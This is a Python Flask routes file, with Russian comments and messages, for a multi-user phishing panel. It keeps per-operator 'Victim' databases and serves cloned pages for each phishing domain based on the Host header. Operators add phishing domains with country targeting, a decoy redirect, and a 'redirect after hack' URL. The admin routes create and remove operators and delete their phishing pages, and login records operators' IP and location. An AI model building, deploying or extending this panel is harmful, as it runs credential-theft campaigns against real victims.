from app import app
from flask import render_template, request, redirect, url_for, flash, make_response, session, jsonify
from werkzeug.security import generate_password_hash, check_password_hash
from hashlib import sha256
from db import User, Victim
import requests
import json
import os
import re
from datetime import datetime
from config import salt, server_domain
import validators

db = User('./users.db', 'users')





def is_valid_domain(domain):
    domain_pattern = r"^(?!:\/\/)(?!https:\/\/)([A-Za-z0-9.-]+(\.[A-Za-z]{2,})+)$"
    if bool(re.match(domain_pattern, domain)):
        length = domain.split('.')
        if len(length) > 2:
            return False
        else:
            return True
    return False





# @app.before_request
# def enforce_https():
#     if request.headers.get('X-Forwarded-Proto', 'http') == 'http':
#         https_url = request.url.replace('http://', 'https://', 1)
#         return redirect(https_url, code=301)





@app.route('/')
def index():
    host = request.headers.get('Host')
    
    if host == server_domain:
        return redirect(url_for('panel'))
    else:
        try:
            path = request.args.get('path', None)
            url = host + '$' + path
            username = os.listdir(f'templates/domains/{url}/')[0]
            return render_template(f'domains/{url}/{username}')
        except:
            domains = os.listdir(f'templates/domains/')
            for domain in domains:
                if host in domain:
                    username = os.listdir(f'templates/domains/{domain}/')
                    db_victim = Victim(f'./users/{username}/database.db')
                    url_redirect = db_victim.GetRedirect()
                    return redirect(url_redirect[0])









###########################################
#                                         #
#                  Вход                   #
#                                         #
###########################################
@app.route('/login', methods=['POST', 'GET'])
def login():
    domain = request.headers.get('Host')
    if domain == server_domain:
        if request.method == 'POST':
        # Если был POST запрос
            user = db.GetUserBy('username', request.form['username'])
            admin_data = db.GetAdmins(request.form['username'])
            pwd = salt+request.form['password']
            if request.form['username'] == admin_data[0] and admin_data[1] == sha256(pwd.encode('utf-8')).hexdigest():
                # Если это админ
                session['username'] = request.form['username']
                return redirect(url_for('panel', username=request.form['username']))
            elif user and check_password_hash(user[0][2], request.form['password']):
                # Если правильные данные
                session['username'] = request.form['username']
                if not user[0][5]:
                    if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
                        ipaddress = request.environ['REMOTE_ADDR']
                    else:
                        ipaddress = request.environ['HTTP_X_FORWARDED_FOR']
                        
                    r = requests.get('http://ip-api.com/json/' + ipaddress)
                    ipdata = json.loads(r.text)

                    if ipdata['status'] == 'success':
                        data = [
                            ['ip', ipaddress],
                            ['city', ipdata['city']],
                            ['country', ipdata['country']],
                            ['updated_on', datetime.utcnow()]
                        ]
                        db.UpdateUser(data, 'username', request.form['username'])
                        
                return redirect(url_for('panel', username=request.form['username']))
            else:
                # Если данные неверные
                flash(('Неверные данные', 'error'))
                return render_template('login.html', login=True)
        else:
        # Если был GET запрос
            # Если есть сессия
            if 'username' in session:
                return redirect(url_for('panel'))
            else:
                # Если нет сессии
                return render_template('login.html')
    else:
        try:
            path = request.args.get('path', None)
            url = domain + '$' + request.path.replace('/', '')
            if path:
                url = domain + '$' + path
            username = os.listdir(f'templates/domains/{url}/')[0]
            return render_template(f'domains/{url}/{username}')
        except:
            return redirect("https://" + domain)
    


###########################################
#                                         #
#                  Панель                 #
#                                         #
###########################################
@app.route('/panel', methods=['POST', 'GET'])
def panel():
    domain = request.headers.get('Host')
    if domain == server_domain:
        global db

        username = request.form.get('username')
        admin = None
        logs = None

        if 'username' in session:
            username = session['username']
        else:
            return redirect(url_for('login'))
        

        if username == db.GetAdmins(session['username'])[0]:
            admin = True
            if request.args.get('users_manage'):
                users = db.GetAllUsers()
                return render_template('users_manage.html', admin=admin, users=users)


        if not admin:
            db_victim = Victim(f'./users/{username}/database.db')
            logs = db_victim.GetLogs()
            if logs:
                logs = logs[0]

        return render_template('index.html', username=username, admin=admin, logs=logs)
    else:
        try:
            path = request.args.get('path', None)
            url = domain + '$' + request.path.replace('/', '')
            if path:
                url = domain + '$' + path
            username = os.listdir(f'templates/domains/{url}/')[0]
            return render_template(f'domains/{url}/{username}')
        except:
            return redirect("https://" + domain)
    


###########################################
#                                         #
#          Добавить пользователя          #
#                                         #
###########################################
@app.route('/add_user', methods=['POST'])
def add_user():
    if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
        username = request.form.get('username')
        password = request.form.get('password')
        note = request.form.get('note')

        user = db.GetUserBy('username', username)

        if user:
            response = {'status': 'error', 'message': 'Такой пользователь уже существует'}
        else:
            db.AddUser(username, generate_password_hash(password), note)
            response = {'status': 'success', 'message': 'Пользователь успешно добавлен'}
        return jsonify(response)
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})
    

###########################################
#                                         #
#          Удалить пользователя           #
#                                         #
###########################################
@app.route('/remove_user', methods=['POST'])
def remove_user():
    if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
        username = request.form.get('username')
        
        user = db.GetUserBy('username', username)

        if user:
            db_victim = Victim(f'./users/{username}/database.db')
            phishes = db_victim.GetDomains()
            domains = os.listdir(f'templates/domains/')
            
            for i in range(0, len(phishes)):
                for host in domains:
                    if host.startswith(phishes[i]):
                        os.rmtree(f'./templates/domains/{host}')
            db.RemoveUser(username)
            response = {'status': 'success', 'message': 'Пользователь успешно удалён'}
        else:
            response = {'status': 'error', 'message': 'Такой пользователь не существует'}
            
        return jsonify(response)
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})


###########################################
#                                         #
#         Изменить пользователя           #
#                                         #
###########################################
@app.route('/edit_user', methods=['POST'])
def edit_user():
    if 'username' in session and session['username'] == db.GetAdmins(session['username'])[0]:
        username = request.form.get('username')
        password = request.form.get('password')
        user_id = request.form.get('user_id')
        city = request.form.get('city')
        country = request.form.get('country')
        note = request.form.get('note')
        user_id = request.form.get('user_id')

        user = db.GetUserBy('id', user_id)

        if user:
            data = [
                ['username', username],
                ['password_hash', generate_password_hash(password)],
                ['city', city],
                ['country', country],
                ['note', note],
            ]

            db.UpdateUser(data, 'id', user_id)
            
            response = {'status': 'success', 'message': 'Пользватель успешно сменён'}
        else:
            response = {'status': 'error', 'message': 'Пользователь не существует'}
            
        return jsonify(response)
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})










###########################################
#                                         #
#                  Домены                 #
#                                         #
###########################################
@app.route('/domains', methods=['GET'])
def domains():
    domain = request.headers.get('Host')
    if domain == server_domain:
        if 'username' in session:
            username = session['username']
        else:
            return redirect(url_for('login'))

        db_victim = Victim(f'./users/{username}/database.db')
        domains = db_victim.GetDomains()

        return render_template('domains.html', domains=domains)
    else:
        try:
            path = request.args.get('path', None)
            url = domain + '$' + path
            username = os.listdir(f'templates/domains/{url}/')[0]
            return render_template(f'domains/{url}/{username}')
        except:
            return redirect("https://" + domain)




###########################################
#                                         #
#              Добавить домен             #
#                                         #
###########################################
@app.route('/add_domain', methods=['POST'])
def add_domain():
    if 'username' in session:
        username = session['username']
        countries = json.loads(request.form.get('countries'))
        domain = request.form.get('domain')
        page = request.form.get('page')
        path = request.form.get('path')
        redirect = request.form.get('redirect')
        redirect_success = request.form.get('redirect_success')
        security = request.form.get('security')

        if not countries or not domain or not page or not redirect or not path or not redirect_success or not security:
            return jsonify({'status': 'error', 'message': 'Заполните полностью форму'})
        else:
            if not validators.url(redirect):
                return jsonify({'status': 'error', 'message': 'Неверная ссылка на редирект с главной страницы, пример: https://link.com'})
            if not validators.url(redirect_success):
                return jsonify({'status': 'error', 'message': 'Неверная ссылка на редирект после взлома, пример: https://link.com'})
            if not is_valid_domain(domain):
                return jsonify({'status': 'error', 'message': 'Неверный домен, домен должен быть первого уровня и без протоколов'})

            db_victim = Victim(f'./users/{username}/database.db')

            if db_victim.CheckDomain(domain):
                return jsonify({'status': 'error', 'message': 'Этот домен уже добавлен'})
            
            data = db_victim.AddDomain(domain, page, path, security, redirect, countries, redirect_success, username)

            if data[0]:
                return jsonify({'status': 'success', 'message': 'Успешно добавлен домен'})
            else:
                return jsonify({'status': 'error', 'message': data[1]})
            
    else:
        return jsonify({'status': 'error', 'message': 'Нет доступа'})







###########################################
#                                         #
#                Редирект                 #
#                                         #
###########################################
@app.errorhandler(404)
def page_not_found(e):
    return redirect(url_for('index', path=request.path.replace('/', '')))





###########################################
#                                         #
#                  Выход                  #
#                                         #
###########################################
@app.route('/logout', methods=['POST'])
def logout():
    if 'username' in session and session['username'] != db.GetAdmins(session['username'])[0]:
        user = db.GetUserBy('username', session['username'])[0]
        data = [
            ['updated_on', datetime.utcnow()]
        ]
        db.UpdateUser(data, 'username', session['username'])
        session.pop('username')
        flash(('Вы вышли из аккаунта', 'warn'), 'info')
    elif session['username'] == db.GetAdmins(session['username'])[0]:
        session.pop('username')
        flash(('Вы вышли из аккаунта', 'warn'), 'info')

    return redirect(url_for('login'))